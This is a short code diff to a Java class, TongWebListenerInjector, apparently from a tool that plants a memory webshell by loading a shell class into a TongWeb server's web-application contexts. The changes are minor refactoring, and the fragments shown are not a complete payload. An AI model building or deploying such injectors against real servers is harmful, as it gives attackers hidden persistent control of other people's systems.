@@ -13,11 +13,10 @@ import java.util.zip.GZIPInputStream;
  */
 public class TongWebListenerInjector {
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public TongWebListenerInjector() {
         if (ok) {
@@ -29,9 +28,7 @@ public class TongWebListenerInjector {
         } catch (Throwable throwable) {
            
         }
-        if (contexts == null || contexts.isEmpty()) {
-           
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                   
@@ -46,7 +43,6 @@ public class TongWebListenerInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
 
     }
 
@@ -89,7 +85,7 @@ public class TongWebListenerInjector {
     
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
